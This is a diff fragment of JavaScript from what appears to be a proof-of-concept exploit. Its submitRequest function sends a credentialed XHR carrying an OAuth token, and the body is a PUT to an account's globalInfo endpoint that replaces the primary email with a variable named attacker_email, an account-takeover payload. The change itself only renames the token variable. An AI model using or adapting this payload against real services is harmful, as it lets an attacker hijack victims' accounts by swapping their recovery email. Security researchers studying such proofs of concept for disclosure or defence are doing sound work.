@@ -12,7 +12,7 @@ function submitRequest()
   xhr.setRequestHeader("accept", "*\/*");
   xhr.setRequestHeader("accept-language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
   xhr.setRequestHeader("content-type", "application\/json");
-  xhr.setRequestHeader("Authorization", "OAuth "+ oa2_token);
+  xhr.setRequestHeader("Authorization", "OAuth "+ access_token );
   xhr.withCredentials = true;
   var body = "{\r\n" + 
     "\"data\":\"{\\\"core\\\":{\\\"primaryEmail\\\":\\\"" + attacker_email + "\\\"}}\",\"headers\":{\"content-type\":\"application/json\"},\"type\":\"PUT\",\"req_service\":\"accounts\",\"url\":\"/v1/account/"+account_id+"/globalInfo\"}\r\n" + 
